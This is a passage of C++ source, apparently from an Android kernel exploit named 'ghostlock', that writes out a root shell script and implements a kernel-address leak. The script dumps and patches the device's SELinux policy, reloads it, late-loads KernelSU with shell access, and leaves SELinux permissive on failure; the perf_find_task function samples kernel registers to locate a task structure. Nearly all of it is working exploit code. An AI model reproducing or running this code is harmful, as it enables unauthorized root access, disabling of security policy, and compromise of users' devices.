            "POLICY=$(mktemp \"$HOME_DIR/.ghostlock_policy.XXXXXX\") || {\n"
            "  echo '[!] cannot create policy dump' >>\"$LOG\"\n"
            "  exit 1\n"
            "}\n"
            "trap 'rm -f \"$POLICY\"; dump_debug; glk_launch_custom' EXIT\n"
            "prepare_policy() {\n"
            "  cat /sys/fs/selinux/policy >\"$POLICY\" || return 1\n"
            "  HEADER=$(od -An -tx1 -N24 \"$POLICY\" | tr -d ' \\n')\n"
            "  case \"$HEADER\" in\n"
            "    8cff7cf9080000005345204c696e7578"
            "\?\?\?\?\?\?\?\?\?\?\?\?\?\?\?\?) ;;\n"
            "    *) echo '[!] invalid policy header'; return 1 ;;\n"
            "  esac\n"
            "  # Restore missing Android netlink flags: bits 30/31, byte 23.\n"
            "  CONFIG=$(od -An -tu1 -j23 -N1 \"$POLICY\") || return 1\n"
            "  [ -n \"$CONFIG\" ] || return 1\n"
            "  CONFIG=$(printf '\\\\0%%03o' \"$((CONFIG | 192))\" || return 1)\n"
            "  printf '%%b' \"$CONFIG\" | dd of=\"$POLICY\" bs=1 seek=23 count=1 conv=notrunc\n"
            "}\n"
            "FIXUP_RC=1\n"
            "for i in $(seq 1 10); do\n"
            "  echo \"[*] fixup: attempt $i\" >>\"$LOG\"\n"
            "  if ! prepare_policy >>\"$LOG\" 2>&1; then\n"
            "    sleep 2\n"
            "    continue\n"
            "  fi\n"
            "  BEFORE_POLICYLOAD=$(od -An -tu4 -j12 -N4 /sys/fs/selinux/status 2>/dev/null | tr -d ' ')\n"
            "  load_policy \"$POLICY\" >>\"$LOG\" 2>&1 &\n"
            "  LPID=$!\n"
            "  (sleep 8; kill -9 $LPID 2>/dev/null) &\n"
            "  SPID=$!\n"
            "  wait $LPID 2>/dev/null\n"
            "  FIXUP_RC=$?\n"
            "  kill $SPID 2>/dev/null\n"
            "  if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
            "    AFTER_POLICYLOAD=$(od -An -tu4 -j12 -N4 /sys/fs/selinux/status 2>/dev/null | tr -d ' ')\n"
            "    echo \"[*] policyload before=$BEFORE_POLICYLOAD after=$AFTER_POLICYLOAD\" >>\"$LOG\"\n"
            "    if [ -n \"$AFTER_POLICYLOAD\" ] && [ \"$AFTER_POLICYLOAD\" != \"$BEFORE_POLICYLOAD\" ]; then\n"
            "      break\n"
            "    fi\n"
            "    echo '[!] load_policy returned success without updating SELinux status' >>\"$LOG\"\n"
            "    FIXUP_RC=1\n"
            "  fi\n"
            "  sleep 2\n"
            "done\n"
            "echo \"[*] policy fixup rc=$FIXUP_RC\" >>\"$LOG\"\n"
            "if [ \"$FIXUP_RC\" -eq 0 ]; then\n"
            "# load_policy ok: late-load (module init re-enforces); already-loaded restores below\n"
            "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
            "  KSU_ALREADY=1\n"
            "  echo \"[*] kernelsu already loaded; skipping late-load\" >>\"$LOG\"\n"
            "else\n"
            "  KSU_ALREADY=0\n"
            "  if [ ! -x \"$KSUD\" ]; then\n"
            "    echo '[!] ksud missing; cannot late-load' >>\"$LOG\"\n"
            "    exit 1\n"
            "  fi\n"
            "  echo \"[*] late-load kmi=$KMI\" >>\"$LOG\"\n"
            "  chmod 755 \"$KSUD\" 2>/dev/null\n"
            "  \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell >>\"$LOG\" 2>&1\n"
            "  echo \"[*] late-load exit=$?\" >>\"$LOG\"\n"
            "fi\n"
            "echo \"[*] temp su uid=$(id -u); watching kernelsu.ko\" >>\"$LOG\"\n"
            "KSU_READY=0\n"
            "for i in $(seq 1 50); do\n"
            "  if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_READY=1; break; fi\n"
            "  sleep 0.1\n"
            "done\n"
            "if [ \"$KSU_READY\" -ne 1 ]; then\n"
            "  echo '[!] KernelSU module not loaded' >>\"$LOG\"\n"
            "  exit 1\n"
            "fi\n"
            "echo '[+] KernelSU module loaded' >>\"$LOG\"\n"
            "if [ \"$KSU_ALREADY\" -eq 1 ]; then\n"
            "  echo \"[*] kernelsu already loaded; restoring enforcing\" >>\"$LOG\"\n"
            "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
            "fi\n"
            "else\n"
            "  echo '[!] fixup failed; SELinux left permissive' >>\"$LOG\"\n"
            "fi\n",
            (config::runtime_config_snapshot().home_dir.c_str()),
            (config::runtime_config_snapshot().ksu_log_path.c_str()),
            native_binary_path.data(),
            session::g_exploit_session.profile.safe_mode() ? 1 : 0,
            (config::runtime_config_snapshot().debug_dir.c_str()));
        if (n < 0 || n >= static_cast<int32_t>(script.size())) {
            pr_warning("root script too long\n");
            return;
        }
        if (write(sfd.get(), script.data(), static_cast<size_t>(n)) != n) {
            pr_warning("write root script failed errno=%d\n", errno);
        }
        sfd.reset();
        chmod((config::runtime_config_snapshot().root_script_path.c_str()), 0755);
        pr_info("root script written path=%s bytes=%d\n", (config::runtime_config_snapshot().root_script_path.c_str()),
                n);
    }

    /* Find a task through perf sample records. */
    uintptr_t perf_find_task(void) {
        struct perf_event_attr pe{};
        pe.type = PERF_TYPE_SOFTWARE;
        pe.size = sizeof(pe);
        pe.config = PERF_COUNT_SW_CPU_CLOCK;
        pe.sample_period = 5000;
        pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
        pe.sample_regs_intr = (1ULL << 32) - 1;
        pe.disabled = 1;
        pe.exclude_user = 1;
        pe.exclude_hv = 1;
        pe.exclude_idle = 1;

        errno = 0;
        support::UniqueFd fd(static_cast<int32_t>(syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0)));
        if (!fd.valid()) {
            pr_warning("perf_event_open failed errno=%d\n", errno);
            return 0;
        }
        constexpr size_t kPerfPageSize = 4096;
        constexpr size_t kPerfDataPages = 32;
        constexpr size_t kPerfDataSize = kPerfPageSize * kPerfDataPages;
        const size_t msz = kPerfPageSize + kPerfDataSize;
        void *mapped = mmap(nullptr, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd.get(), 0);
        if (mapped == MAP_FAILED) {
            pr_warning("perf mmap failed errno=%d\n", errno);
            return 0;
        }
        /* Declaration order keeps the original release order: munmap (buf) runs
         * before close (fd) when this scope exits. */
        support::MappedRegion buf(mapped, msz);
        ioctl(fd.get(), PERF_EVENT_IOC_ENABLE, 0);
        for (int32_t i = 0; i < 500000; i++) syscall(__NR_getpid);
        ioctl(fd.get(), PERF_EVENT_IOC_DISABLE, 0);
        auto *hdr = static_cast<struct perf_event_mmap_page *>(buf.data());
        const uint64_t head = hdr->data_head;
        std::atomic_thread_fence(std::memory_order_acquire);
        char *base = reinterpret_cast<char *>(buf.data()) + kPerfPageSize;
        uint64_t pos = hdr->data_tail;
        std::array<uintptr_t, 256> cands{};
        int32_t nc = 0;
        while (pos < head && nc < static_cast<int32_t>(cands.size())) {
            auto *ev = reinterpret_cast<struct perf_event_header *>(
                base + (pos % kPerfDataSize));
            if (ev->size == 0) break;
            if (ev->type == PERF_RECORD_SAMPLE) {
                char *p = reinterpret_cast<char *>(ev) + sizeof(*ev);
                p += 8; /* skip IP */
                uint64_t abi = *reinterpret_cast<uint64_t *>(p);
                p += 8;
                if (abi == 1 || abi == 2) {
                    uint64_t *regs = reinterpret_cast<uint64_t *>(p);
                    for (int32_t i = 0; i < 32 && nc < static_cast<int32_t>(cands.size()); i++) {
                        uint64_t v = regs[i];
                        /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
                        v |= 0x0fULL << 56;
                        if (in_direct_map(v))
                            cands[static_cast<size_t>(nc++)] = v;
                    }
                }
            }
            pos += ev->size;
        }
        hdr->data_tail = head;
        if (!nc) return 0;
        uintptr_t best = 0;
        int32_t best_cnt = 0;
        for (int32_t i = 0; i < nc; i++) {
            const auto at = cands[static_cast<size_t>(i)];
            const int32_t cnt = static_cast<int32_t>(
                std::count(cands.begin(), cands.begin() + nc, at));
            if (cnt > best_cnt) {
                best_cnt = cnt;
                best = at;
            }
        }
        pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
        return best;
    }
} // namespace ghostlock::attack
